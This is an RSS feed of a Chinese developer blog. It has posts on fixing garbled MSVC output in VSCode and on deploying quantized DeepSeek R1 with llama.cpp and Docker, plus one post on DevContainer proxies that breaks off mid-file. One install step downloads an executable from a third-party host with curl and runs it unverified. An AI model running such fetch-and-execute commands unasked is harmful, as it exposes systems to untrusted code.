<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hsfzxjy 的博客</title>
    <link>https://i.hsfzxjy.site/</link>
    
    <atom:link href="https://i.hsfzxjy.site/rss.xml" rel="self" type="application/rss+xml"/>
    
    <description>Creation and blogs by hsfzxjy.</description>
    <pubDate>Sun, 20 Apr 2025 14:42:22 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>解决 VSCode + CMake + MSVC 编译器信息乱码的问题</title>
      <link>https://i.hsfzxjy.site/fixing-vscode-msvc-gibbrish/</link>
      <guid>https://i.hsfzxjy.site/fixing-vscode-msvc-gibbrish/</guid>
      <pubDate>Sat, 19 Apr 2025 08:27:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;在 VSCode 中使用 &lt;a href=&quot;https://marketplace.visualstudio.com/items/?itemName=ms-vscode.cmake-tools&quot;&gt;CMake Tools&lt;/a&gt; 插件开发 C++ 时，如果选用 MSVC 编</description>
        
      
      
      
      <content:encoded><![CDATA[<p >在 VSCode 中使用 <a href="https://marketplace.visualstudio.com/items/?itemName=ms-vscode.cmake-tools">CMake Tools</a> 插件开发 C++ 时，如果选用 MSVC 编译器，可能会遇到编译信息乱码的问题：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line">warning C4267: 鈥滃弬鏁扳€�: 浠庘€渟ize_t鈥濊浆鎹㈠埌鈥淒WORD鈥濓紝鍙�鑳戒涪澶辨暟鎹�</span><br></pre></div></div><p >乱码的产生通常是由于文本的创建者和解析者之间存在编码差异。在本例中，MSVC 的编译器 <code>cl.exe</code> 以 UTF-8 编码输出中文信息，却被 CMake Tools 以错误的 GBK 编码解析，进而导致乱码。</p><p >基于此原理，有两个解决的方向：</p><ol><li>修复二者的编码差异</li><li>让 <code>cl.exe</code> 使用英文输出</li></ol><p >以下给出四种解决方案，推荐程度由高到低排序。</p><h2 id="方案一：让-cmake-tools-插件以-utf-8-解析信息">方案一：让 CMake Tools 插件以 UTF-8 解析信息</h2><p >在 VSCode 设置中修改 <code>cmake.outputLogEncoding</code> 为 <code>utf-8</code>。此方法提出于 <a href="https://github.com/microsoft/vscode-cmake-tools/issues/3632#issuecomment-2408228688">相关 Issue</a>。</p><h2 id="方案二：让-clexe-输出英文">方案二：让 cl.exe 输出英文</h2><p >增加一个新的全局环境变量 <code>VSLANG=1033</code>，禁用 MSVC 的本地化出书。其中 1033 是英语的语言代码，语言代码的列表详见 <a href="https://github.com/microsoft/vcpkg-tool/blob/main/docs/localization.md#selecting-a-language">vcpkg-tools/docs/localization.md</a>。</p><h2 id="方案三：删除-msvc-的本地化语言包">方案三：删除 MSVC 的本地化语言包</h2><blockquote><p ><strong>请谨慎使用本方法，确保明白其可能的后果。</strong></p></blockquote><p >如果当初 <a href="https://visualstudio.microsoft.com/downloads/?q=build+tools#build-tools-for-visual-studio-2022">MSVC 的安装程序</a> 还没删，可以再次打开它，反选其中的中文语言包，卸载。</p><p ><img loading="lazy" src="../assets/2025-04-19-fixing-vscode-msvc-gibbrish/image.png" alt=""></p><p >如果安装包已经找不到了，可以用以下 PowerShell 命令手动删除：</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line"><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;C:\Program Files (x86)\Microsoft Visual Studio\&quot;</span></span><br><span class="line"><span class="hljs-built_in">Get-ChildItem</span> <span class="hljs-literal">-Recurse</span> <span class="hljs-literal">-Force</span> <span class="hljs-literal">-Directory</span> <span class="hljs-literal">-Filter</span> <span class="hljs-string">&#x27;2052&#x27;</span> | <span class="hljs-built_in">ForEach-Object</span> {</span><br><span class="line">    <span class="hljs-variable">$newName</span> = <span class="hljs-string">&quot;<span class="hljs-variable">$</span>(<span class="hljs-variable">$_</span>.Parent.FullName)\2052_&quot;</span></span><br><span class="line">    <span class="hljs-built_in">Rename-Item</span> <span class="hljs-literal">-Path</span> <span class="hljs-variable">$_</span>.FullName <span class="hljs-literal">-NewName</span> <span class="hljs-variable">$newName</span></span><br><span class="line">}</span><br></pre></div></div><h2 id="方案四：更改系统全局代码页（不推荐）">方案四：更改系统全局代码页（不推荐）</h2><blockquote><p ><strong>请谨慎使用本方法。该方法可能使一些老旧程序乱码。</strong></p></blockquote><p >如 <a href="https://superuser.com/a/1435645/1184013">这个问答</a> 所述，可通过修改系统代码页为 65001 (UTF-8) 彻底解决问题。具体操作是：控制面板 -&gt; 时钟和区域 -&gt; 区域 -&gt; 管理 -&gt; 更改系统区域设置 -&gt; 勾选“Beta 版：使用 Unicode UTF-8 提供全球语言支持”。</p><p >需要注意的是，一些编写方式不正确的老旧程序可能会无视系统代码页的变化，从而乱码。该方法应作为最后手段使用。</p>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      <category domain="https://i.hsfzxjy.site/categories/Memo/">Memo</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Encoding/">Encoding</category>
      
      <category domain="https://i.hsfzxjy.site/tags/MSVC/">MSVC</category>
      
      <category domain="https://i.hsfzxjy.site/tags/CMake/">CMake</category>
      
      <category domain="https://i.hsfzxjy.site/tags/VSCode/">VSCode</category>
      
      
      <comments>https://i.hsfzxjy.site/fixing-vscode-msvc-gibbrish/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>使用 3090 部署 1.58bit 动态量化版 DeepSeek R1 671b</title>
      <link>https://i.hsfzxjy.site/deepseek-r1-158bit-on-3090/</link>
      <guid>https://i.hsfzxjy.site/deepseek-r1-158bit-on-3090/</guid>
      <pubDate>Sat, 22 Feb 2025 09:47:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;1.58 bit 量化技术通过将每个权值量化为仅有三个状态，最大程度地节约显存并加速推理。&lt;/p&gt;
&lt;p &gt;Unsloth AI 在 &lt;a href=&quot;https://unsloth.ai/blog/deepseekr1-dynamic&quot;&gt;Run DeepSeek R1 </description>
        
      
      
      
      <content:encoded><![CDATA[<p >1.58 bit 量化技术通过将每个权值量化为仅有三个状态，最大程度地节约显存并加速推理。</p><p >Unsloth AI 在 <a href="https://unsloth.ai/blog/deepseekr1-dynamic">Run DeepSeek R1 Dynamic 1.58-bit</a> 一文介绍了 1.58 bit 动态量化版的 DeepSeek R1 671b（以下简称 unsloth 版）。我们知道 DeepSeek R1 70b 及以下的版本都是通过知识蒸馏得到的，唯有 671b 是满血的版本。然而原版 671b 的推理需要大量显存及算力，仅模型文件便有 404GB。</p><p >unsloth 版有选择地对部分权值作 1.58 bit 量化，将模型文件压缩至 131GB，同时也保持了不错的生成质量。结合 <a href="https://github.com/ggml-org/llama.cpp">llama.cpp</a> 实现的 CPU+GPU 混合推理，我们可在低成本的硬件上部署 671b 模型。</p><h2 id="使用-llama-bench-测试生成速度">使用 llama-bench 测试生成速度</h2><p >先说结论。笔者在实验室集群单个 3090 节点上尝试部署 unsloth 版 671b 模型，最大 token 生成速度可达 10 tokens/s，足够应付单人日常使用。节点的硬件配置如下：</p><ul><li><strong>CPU –</strong> AMD EPYC 7402 24-Core Processor</li><li><strong>RAM –</strong> 32GB x 16, DIMM DDR4 Synchronous Registered (Buffered) 3200 MHz</li><li><strong>GPU –</strong> 8x NVIDIA GeForce RTX 3090 (24GB VRAM)</li></ul><p >以下是 token 生成速度与 GPU Layers 数量的关系曲线：</p><p ><object type="image/svg+xml" data="/assets/2025-02-07-deepseek-r1-158bit-on-3090/speed.svg"></object></p><p >GPU Layers 指置于 GPU 上的网络层数，取值范围为 0~62，可由 CLI 参数 <code>--n-gpu-layers</code> 配置。其中取 0 时代表完全使用 CPU 运行，取 62 时代表完全使用 GPU 运行。图中还标出了不同 GPU Layers 数量所需的 GPU 卡数（顶部横轴），以方便读者根据自己的显存大小调整 GPU Layers。</p><p >值得注意的是，虽然 7 张 3090 可以放下整个模型，在实际推理时考虑到 Context 的额外开销，所需显存可能不止于此，比如我后文部署 <code>--ctx-size=8192</code> 的 llama-server 时就需要占满 8 张 3090。</p><p >以上测试数据由如下脚本得出：</p><div class="gk-code hljs" data-gk-id="BLOCK1" data-gk-title="bench.sh"><div class="gk-code-display"><pre><span class="gk-section gk-zip zipped" data-gk-sid="BLOCK1.SEC1" data-gk-type="zip"><span class="line"><span class="hljs-built_in">export</span> CUDA_VISIBLE_DEVICES=0</span><br><span class="line">next_gpu=1</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {0..62}; <span class="hljs-keyword">do</span></span><br><span class="line">    <span class="hljs-built_in">mkdir</span> -p benchout</span><br><span class="line">    <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span></span><br><span class="line">        ./llama.cpp/build/bin/llama-bench \</span><br><span class="line">            --model /models/DeepSeek-R1-GGUF/DeepSeek-R1-UD-IQ1_S/DeepSeek-R1-UD-IQ1_S-00001-of-00003.gguf \</span><br><span class="line">            --cache-type-k q4_0 \</span><br><span class="line">            --threads 64 --prio 2 \</span><br><span class="line">            --n-gpu-layers <span class="hljs-variable">$i</span> -n 128 2&gt;&amp;1 | <span class="hljs-built_in">tee</span> benchout/bench-<span class="hljs-variable">$i</span>.<span class="hljs-built_in">log</span></span><br><span class="line">        <span class="hljs-keyword">if</span> [ <span class="hljs-variable">${PIPESTATUS[0]}</span> -eq 0 ]; <span class="hljs-keyword">then</span></span><br><span class="line">            <span class="hljs-built_in">break</span></span><br><span class="line">        <span class="hljs-keyword">else</span></span><br><span class="line">            <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Retrying...&quot;</span></span><br><span class="line">            <span class="hljs-built_in">export</span> CUDA_VISIBLE_DEVICES=<span class="hljs-variable">${CUDA_VISIBLE_DEVICES}</span>,<span class="hljs-variable">${next_gpu}</span></span><br><span class="line">            next_gpu=$((next_gpu + <span class="hljs-number">1</span>))</span><br><span class="line">        <span class="hljs-keyword">fi</span></span><br><span class="line">    <span class="hljs-keyword">done</span></span><br><span class="line"><span class="hljs-keyword">done</span></span><br></span></pre></div></div><p >下面介绍如何借助 llama.cpp 运行一个基础可用的 Web 界面，以使用 unsloth 版 671b 模型。</p><h2 id="llama-server-服务部署">llama-server 服务部署</h2><h3 id="模型下载">模型下载</h3><p >本次使用的模型位于 Huggingface 的 <a href="https://huggingface.co/unsloth/DeepSeek-R1-GGUF/tree/main/DeepSeek-R1-UD-IQ1_S">unsloth/DeepSeek-R1-GGUF 仓库</a>。仓库提供了多种量化的版本，我们只需下载其中的 <code>DeepSeek-R1-UD-IQ1_S</code> 目录，置于 <code>/mnt/models/</code> 路径，形成以下结构：</p><div class="gk-code hljs" data-gk-id="BLOCK2"><div class="gk-code-display"><pre><span class="line">/mnt/models/DeepSeek-R1-GGUF/DeepSeek-R1-UD-IQ1_S</span><br><span class="line">├── DeepSeek-R1-UD-IQ1_S-00001-of-00003.gguf</span><br><span class="line">├── DeepSeek-R1-UD-IQ1_S-00002-of-00003.gguf</span><br><span class="line">└── DeepSeek-R1-UD-IQ1_S-00003-of-00003.gguf</span><br></pre></div></div><p >下载模型可使用 Python 的 <code>huggingface_hub</code> 库：</p><div class="gk-code hljs" data-gk-id="BLOCK3" data-gk-title="Download with Python"><div class="gk-code-display"><pre><span class="gk-section gk-zip zipped" data-gk-sid="BLOCK3.SEC1" data-gk-type="zip"><span class="line"><span class="hljs-keyword">import</span> os</span><br><span class="line">os.environ[<span class="hljs-string">&quot;HF_HUB_ENABLE_HF_TRANSFER&quot;</span>] = <span class="hljs-string">&quot;1&quot;</span></span><br><span class="line"><span class="hljs-keyword">from</span> huggingface_hub <span class="hljs-keyword">import</span> snapshot_download</span><br><span class="line">snapshot_download(</span><br><span class="line">  repo_id = <span class="hljs-string">&quot;unsloth/DeepSeek-R1-GGUF&quot;</span>,</span><br><span class="line">  local_dir = <span class="hljs-string">&quot;/mnt/models&quot;</span>,</span><br><span class="line">  allow_patterns = [<span class="hljs-string">&quot;*UD-IQ1_S*&quot;</span>],</span><br><span class="line">)</span><br></span></pre></div></div><p >当然，如果环境中不方便使用 Python，笔者推荐使用 <a href="https://github.com/bodaay/HuggingFaceModelDownloader">HuggingFaceModelDownloader</a> 下载。这是一个用 Go 编写的下载器，无需像 Python 那样配置环境即可使用：</p><div class="gk-code hljs" data-gk-id="BLOCK4" data-gk-title="Download with hfd"><div class="gk-code-display"><pre><span class="line">curl -sSL https://g.bodaay.io/hfd -o hfd &amp;&amp; <span class="hljs-built_in">chmod</span> +x hfd</span><br><span class="line">./hfd -m unsloth/DeepSeek-R1-GGUF:UD-IQ1_S -c 8 -s /mnt/models</span><br></pre></div></div><h3 id="编译-llamacpp-及启动-llama-server-服务">编译 llama.cpp 及启动 llama-server 服务</h3><p >运行 1.58 bit 的 DeepSeek R1 需要使用 <a href="https://github.com/ggerganov/llama.cpp">llama.cpp</a>。笔者选择使用 Docker 部署，以避免繁琐的环境配置。</p><p >为了方便读者使用，笔者将镜像的准备和启动过程整合到了 Docker Compose 文件中。读者只需将以下两个文件 <code>compose.yaml</code> 和 <code>llama_Dockerfile</code> 放在同一个目录下，执行 <code>docker compose up</code> 即可启动 llama-server。llama-server 内置了一个简单的 Web 界面，可以通过 <code>http://localhost:10000</code> 访问。</p><div class="gk-unified-code tab" data-gk-style="tab"><div class="gk-code hljs" data-gk-id="docker-compose" data-gk-title="compose.yaml"><div class="gk-code-display"><pre><span class="line"><span class="hljs-attr">services:</span></span><br><span class="line">  <span class="hljs-attr">deepseek:</span></span><br><span class="line">    <span class="hljs-attr">build:</span></span><br><span class="line">      <span class="hljs-attr">args:</span></span><br><span class="gk-section gk-section" data-gk-sid="docker-compose.SEC1" data-gk-type="section"data-gk-desc="如果你访问 GitHub 需要代理，在这里设置，如 PROXY=http://127.0.0.1:1081"data-gk-desc-show="true"><span class="line">        <span class="hljs-bullet">-</span> <span class="hljs-string">PROXY=</span></span><br></span><span class="gk-section gk-section" data-gk-sid="docker-compose.SEC2" data-gk-type="section"data-gk-desc="html:根据自己的 GPU 型号设置 arch 值，如 RTX 3090 对应 86。&lt;br&gt;详细列表可在这里查询 &lt;a href=&quot;https://developer.nvidia.com/cuda-gpus&quot; target=_blank&gt;CUDA GPUs&lt;/a&gt;"data-gk-desc-show="true"><span class="line">        <span class="hljs-bullet">-</span> <span class="hljs-string">CUDA_ARCH=86</span></span><br></span><span class="line">      <span class="hljs-attr">dockerfile:</span> <span class="hljs-string">llama_Dockerfile</span></span><br><span class="line">    <span class="hljs-attr">command:</span> <span class="hljs-string">|</span></span><br><span class="line"><span class="hljs-string">      llama-server</span></span><br><span class="line"><span class="hljs-string">      --model /models/DeepSeek-R1-GGUF/DeepSeek-R1-UD-IQ1_S/DeepSeek-R1-UD-IQ1_S-00001-of-00003.gguf</span></span><br><span class="line"><span class="hljs-string">      --cache-type-k q4_0</span></span><br><span class="line"><span class="hljs-string">      --threads 12 --prio 2</span></span><br><span class="line"><span class="hljs-string">      --temp 0.6</span></span><br><span class="line"><span class="hljs-string">      --ctx-size 8192</span></span><br><span class="line"><span class="hljs-string">      --port 10000</span></span><br><span class="line"><span class="hljs-string">      --host 0.0.0.0</span></span><br><span class="gk-section gk-section" data-gk-sid="docker-compose.SEC3" data-gk-type="section"data-gk-desc="offload 到 GPU 上的网络层数，取值 0~62，根据自己 VRAM 大小调整"data-gk-desc-show="true"><span class="line"><span class="hljs-string">      --n-gpu-layers 62</span></span><br></span><span class="line"><span class="hljs-string"></span>    <span class="hljs-attr">volumes:</span></span><br><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-string">/mnt/models:/models</span></span><br><span class="line">    <span class="hljs-attr">ports:</span></span><br><span class="line">      <span class="hljs-bullet">-</span> <span class="hljs-number">10000</span><span class="hljs-string">:10000</span></span><br><span class="line">    <span class="hljs-attr">deploy:</span> { <span class="hljs-attr">resources:</span> { <span class="hljs-attr">reservations:</span> { <span class="hljs-attr">devices:</span> { <span class="hljs-attr">driver:</span> <span class="hljs-string">nvidia</span>, <span class="hljs-attr">capabilities:</span> [ <span class="hljs-string">gpu</span> ],</span><br><span class="gk-section gk-section" data-gk-sid="docker-compose.SEC4" data-gk-type="section"data-gk-desc="根据实际情况调整 GPU 数量"data-gk-desc-show="true"><span class="line">      <span class="hljs-attr">count:</span> <span class="hljs-number">8</span></span><br></span><span class="line">    } } } }</span><br></pre></div></div><div class="gk-code hljs" data-gk-id="dockerfile" data-gk-title="llama_Dockerfile"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">FROM</span> hsfzxjy/devkit:cuda11.<span class="hljs-number">7.1</span></span><br><span class="line"><span class="hljs-keyword">ARG</span> PROXY</span><br><span class="line"><span class="hljs-keyword">ENV</span> http_proxy=${PROXY} https_proxy=${PROXY}</span><br><span class="line"><span class="hljs-keyword">RUN</span><span class="language-bash"> <span class="hljs-built_in">mkdir</span> /app/ &amp;&amp; <span class="hljs-built_in">cd</span> /app &amp;&amp; git <span class="hljs-built_in">clone</span> https://github.com/ggerganov/llama.cpp</span></span><br><span class="line"><span class="hljs-keyword">WORKDIR</span><span class="language-bash"> /app/llama.cpp</span></span><br><span class="line"><span class="hljs-keyword">RUN</span><span class="language-bash"> apt-get install -y libcurl4-openssl-dev</span></span><br><span class="line"><span class="hljs-keyword">ARG</span> CUDA_ARCH</span><br><span class="line"><span class="hljs-keyword">RUN</span><span class="language-bash"> cmake . -B build \</span></span><br><span class="line"><span class="language-bash">    -DBUILD_SHARED_LIBS=OFF -DGGML_CUDA=ON -DLLAMA_CURL=ON -DCMAKE_CUDA_ARCHITECTURES=<span class="hljs-variable">${CUDA_ARCH}</span></span></span><br><span class="line"><span class="hljs-keyword">RUN</span><span class="language-bash"> cmake --build build --config Release -j16 --clean-first --target llama-cli llama-server llama-bench</span></span><br><span class="line"><span class="hljs-keyword">ENV</span> PATH=/app/llama.cpp/build/bin:${PATH}</span><br><span class="line"><span class="hljs-keyword">ENV</span> http_proxy= https_proxy=</span><br></pre></div></div></div>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Tech/">Tech</category>
      
      
      <category domain="https://i.hsfzxjy.site/tags/Deep-Learning/">Deep Learning</category>
      
      <category domain="https://i.hsfzxjy.site/tags/DeepSeek/">DeepSeek</category>
      
      <category domain="https://i.hsfzxjy.site/tags/Quantization/">Quantization</category>
      
      <category domain="https://i.hsfzxjy.site/tags/RTX-3090/">RTX 3090</category>
      
      <category domain="https://i.hsfzxjy.site/tags/llama-cpp/">llama.cpp</category>
      
      
      <comments>https://i.hsfzxjy.site/deepseek-r1-158bit-on-3090/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>如何在 VS Code DevContainer 中配置 HTTP 代理</title>
      <link>https://i.hsfzxjy.site/configure-http-proxy-in-devcontainer/</link>
      <guid>https://i.hsfzxjy.site/configure-http-proxy-in-devcontainer/</guid>
      <pubDate>Tue, 21 Jan 2025 04:27:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;&lt;a href=&quot;/devcontainers-behind-jump-proxy/&quot;&gt;上回&lt;/a&gt; 我们讲了如何在跳板机背后的服务器上使用 VS Code Remote - Containers。DevContainer 中还有个棘手的问题是网络代理，本文将聊聊在 VS</description>
        
      
      
      
      <content:encoded><![CDATA[<p ><a href="/devcontainers-behind-jump-proxy/">上回</a> 我们讲了如何在跳板机背后的服务器上使用 VS Code Remote - Containers。DevContainer 中还有个棘手的问题是网络代理，本文将聊聊在 VS Code 中配置代理的问题，以及我目前的解决方案。</p><figure class="d2"><svg xmlns="http://www.w3.org/2000/svg" width="714" height="168" preserveAspectRatio="xMinYMin meet" viewBox="0 0 1019 239"><svg id="d2-svg" width="1019" height="239" class="d2-791276444" viewBox="-1 35 1019 239"><rect width="1019" height="239" x="-1" y="35" stroke-width="0" rx="0" style="fill:#fff"/><style>.d2-791276444 .text-mono{font-family:'d2-791276444-font-mono'}@font-face{font-family:d2-791276444-font-mono;src:url(data:application/font-woff;base64,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